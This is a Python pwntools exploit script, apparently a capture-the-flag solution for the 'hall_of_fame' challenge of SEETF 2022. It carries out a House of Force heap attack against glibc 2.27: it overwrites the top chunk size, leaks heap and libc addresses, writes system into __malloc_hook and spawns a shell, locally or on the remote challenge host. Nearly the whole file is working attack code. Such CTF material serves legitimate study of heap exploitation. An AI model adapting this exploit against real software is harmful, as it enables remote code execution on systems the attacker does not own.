#!/usr/bin/env python3
#5-06-2022
#Gon 
#House of force:  overwrite the top chunk with 0xffffffffffffffff which expand heap memory. Then calculate distance to __malloc_hook and write system into it.

from pwn import *

exe = ELF("hall_of_fame_patched")
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote("fun.chall.seetf.sg", '50004')
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io

def malloc(size, data):
    io.sendlineafter(b'Choose> ', b'1')
    io.sendlineafter(b'> ', str(size))
    io.sendline(data)

def view():
    io.sendlineafter(b'Choose> ', b'2')

io = conn()
malloc(16, b'a' * 24 + p64(0xffffffffffffffff))

view()
io.recvuntil(b'at ')
leak = io.recvuntil(b'\n', drop=True)
heap = int(leak.ljust(8, b'\x00'), 16) 
info("heap: %#x", heap)

io.recvuntil(b'at ')
leak = io.recvuntil(b'\n', drop=True)
libc.address = int(leak.ljust(8, b'\x00'), 16) - 0x80970
info("Libc base: %#x", libc.address)

malloc_hook = libc.sym['__malloc_hook']
distance = malloc_hook - heap - 0x10 - 0x8 - 0x8 - 0x10 
#subtracting the size of the allocated chunk (0x10), 
#subtract other 8 bytes between the heap base and the start of the first chunk, 
#subtract a further 8 bytes for the chunk size metadata, 
#and 0x10 for the new chunk.
info("Malloc_hook:%#x", malloc_hook)

malloc(distance, b'/bin/sh\x00')

malloc(8, p64(libc.sym.system))
binsh = heap + 32 #distance from where "/bin/sh' is located
info("binsh:%#x", binsh)
malloc(binsh, b'')

io.interactive()
